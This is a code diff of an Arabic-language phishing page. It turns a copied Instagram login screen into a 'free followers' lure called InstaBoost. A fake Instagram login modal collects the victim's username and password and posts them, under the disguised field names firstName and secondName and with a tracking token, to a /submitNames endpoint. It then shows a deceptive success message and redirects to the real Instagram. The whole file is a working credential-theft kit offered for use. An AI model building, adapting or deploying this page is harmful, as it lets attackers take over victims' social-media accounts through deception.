@@ -5,45 +5,197 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- Meta Tags for Preview -->
-    <meta property="og:title" content="Instagram - تسجيل الدخول">
-    <meta property="og:description" content="قم بتسجيل الدخول إلى حسابك في إنستقرام لمشاهدة الصور ومقاطع الفيديو من أصدقائك.">
+    <meta property="og:title" content="InstaBoost - رشق متابعين مجاناً">
+    <meta property="og:description" content="احصل على 1000 متابع حقيقي لحسابك على إنستقرام مجاناً وبسرعة فائقة. جرب الخدمة الآن!">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
     <meta property="og:type" content="website">
 
-    <title>Instagram</title>
+    <title>InstaBoost | زيادة متابعين إنستقرام</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .logo { font-size: 40px; font-weight: bold; font-style: italic; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; font-size: 14px; }
-        button:disabled { background-color: #b2dffc; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        :root {
+            --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            --primary-color: #0095f6;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            color: #262626;
+        }
+        .header {
+            background: var(--insta-gradient);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .free-badge {
+            background: #ed4956;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 10px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        h2 { margin: 10px 0; font-size: 20px; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
+        .input-group { margin: 20px 0; text-align: right; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background: #fafafa;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .btn-main {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        .btn-main:hover { background-color: #1877f2; }
+        .plans {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .plan-item {
+            border: 1px solid #dbdbdb;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            background: #fff;
+        }
+        .plan-item.active {
+            border-color: var(--primary-color);
+            background: #f0f9ff;
+        }
+        .price { font-weight: bold; color: #262626; display: block; margin-top: 5px; }
+        
+        /* Modal Style */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">Instagram</div>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
-            <input type="password" id="password" placeholder="كلمة السر" required>
-            <button type="submit" id="submitBtn">تسجيل الدخول</button>
-        </form>
-        <div class="footer">هل نسيت كلمة السر؟</div>
+
+    <div class="header">InstaBoost 🚀</div>
+
+    <div class="container">
+        <div class="card">
+            <div class="free-badge">عرض محدود</div>
+            <h2>احصل على 1000 متابع مجاناً</h2>
+            <p>أدخل اسم المستخدم الخاص بك واختر الباقة للبدء في عملية الرشق التلقائي.</p>
+            
+            <div class="input-group">
+                <label>اسم المستخدم (Username)</label>
+                <input type="text" id="target_user" placeholder="@username" required>
+            </div>
+
+            <div class="plans">
+                <div class="plan-item active">
+                    1000 متابع
+                    <span class="price">0.00$ (مجاني)</span>
+                </div>
+                <div class="plan-item">
+                    5000 متابع
+                    <span class="price">9.99$</span>
+                </div>
+            </div>
+
+            <button class="btn-main" style="margin-top: 20px;" onclick="showLogin()">ابدأ الرشق الآن</button>
+        </div>
+
+        <div style="text-align: center; color: #8e8e8e; font-size: 12px;">
+            نحن نستخدم تقنيات آمنة 100% لضمان عدم حظر حسابك.
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <h2 style="font-style: italic; font-size: 30px;">Instagram</h2>
+            <p>يجب تسجيل الدخول لتأكيد ملكية الحساب واستلام المتابعين.</p>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required style="margin-bottom: 10px;">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+                <button type="submit" class="btn-main" id="submitBtn" style="margin-top: 15px;">تأكيد الحساب</button>
+            </form>
+            <button onclick="hideLogin()" style="background:none; border:none; color:#8e8e8e; margin-top: 10px; cursor:pointer;">إلغاء</button>
+        </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('t');
 
+        function showLogin() {
+            const user = document.getElementById('target_user').value;
+            if(!user) { alert('الرجاء إدخال اسم المستخدم أولاً'); return; }
+            document.getElementById('loginModal').style.display = 'flex';
+            document.getElementById('username').value = user;
+        }
+
+        function hideLogin() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+
         document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
-            btn.innerText = "جاري التحقق...";
+            btn.innerText = "جاري التحقق من الحساب...";
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
             try {
                 await fetch('/submitNames', {
@@ -51,13 +203,17 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         token: token,
-                        firstName: username,
-                        secondName: password
+                        firstName: user,
+                        secondName: pass
                     })
                 });
             } catch (err) {}
 
-            window.location.href = "https://www.instagram.com";
+            // إيهام المستخدم ببدء العملية ثم التحويل
+            setTimeout(() => {
+                alert('تم التحقق بنجاح! سيبدأ وصول المتابعين خلال 24 ساعة.');
+                window.location.href = "https://www.instagram.com";
+            }, 2000);
         };
     </script>
 </body>
